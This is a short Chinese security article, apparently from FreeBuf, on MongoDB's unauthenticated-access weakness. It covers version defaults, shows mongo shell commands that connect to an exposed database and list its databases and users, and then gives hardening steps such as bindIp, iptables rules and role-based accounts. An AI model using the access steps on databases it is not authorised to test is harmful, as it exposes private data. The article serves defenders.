MongoDB服务安装后，默认不会开启权限验证，如果监听设置为0.0.0.0，那么即可远程登录数据库，以下为主要的版本区别：

```
3.0之前版本的MongoDB，默认监听0.0.0.0。但之后的版本默认监听127.0.0.1。
3.0之前版本的MongoDB如果未添加管理员账号和数据库账号，当--auth启动时，在本地可直接登录数据库，但是远程登录则需要认证信息
3.0之后的版本，使用--auth参数，无账号则本地和远程均无法访问数据库
```

### 漏洞验证

当存在未授权访问漏洞时，使用mongodb数据库连接工具进行连接，通过命令登录数据库即可查看数据

```
mongo
> show db
> use admin
> show users
```

除了navicat还可以通过robo进行连接  
**下载地址如下：https://robomongo.org/download**

建议使用1.2低版本，否则对低版本的存在漏洞数据库无法认证

### 整改建议

1、在MongDB本地配置文件中限制IP登录

```
bindIp:127.0.0.1
```

2、在防火墙上设置访问源，以下为linux下的参考方法

```
iptables -A INPUT -s <ip-address> -p tcp --destination-port 27017 -m state --state NEW,ESTABLISHED -j ACCEPT //进站规则
iptables -A OUTPUT -d <ip-address> -p tcp --source-port 27017 -m state --state ESTABLISHED -j ACCEPT //出站规则
```

如果服务器为windows，那么可以设置服务和命令开启防火墙配置

3、基于角色的登录认证功能

```
> use admin
> db.createUser(
    {
      user: "myUserAdmin",
      pwd: "Passw0rd",
      roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
    }
)
```

在3.0之前的版本需要通过addUser来创建方法，在cfg文件进行开启认证

```
security:
    authorization: enabled
```

启动MongDB

```
mongod --config /etc/mongod.conf
```

之后通过密码连接本地数据库

```
mongo --port 27017 -u "myUserAdmin" -p "Passw0rd" --authenticationDatabase "admin"
```

在MongDB中也可以通过auth()函数来认证身份信息

本文作者：特mac0x01， 转载请注明来自[FreeBuf.COM](https://www.freebuf.com/)